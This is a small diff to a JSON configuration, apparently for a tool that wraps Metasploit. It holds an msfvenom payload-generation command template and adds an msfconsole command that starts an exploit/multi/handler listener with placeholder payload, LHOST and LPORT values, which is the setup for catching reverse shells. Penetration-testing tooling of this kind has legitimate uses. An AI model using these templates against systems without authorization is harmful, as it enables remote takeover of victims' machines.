@@ -18,7 +18,8 @@
             "name": "Metasploit",
             "generator": "msfvenom",
             "generatorcommand": "-p <--payload--> LHOST=<--ip--> LPORT=<--port--> -f hex",
-            "listenercommand": "msfconsole",
+            "listener": "msfconsole",
+            "listenercommand": "-x use exploit/multi/handler;\\set PAYLOAD <--payload-->;\\set LHOST <--ip-->;\\set LPORT <--port-->;\\run",
             "payloads": [
                 {
                     "operatingsystem": "Windows",
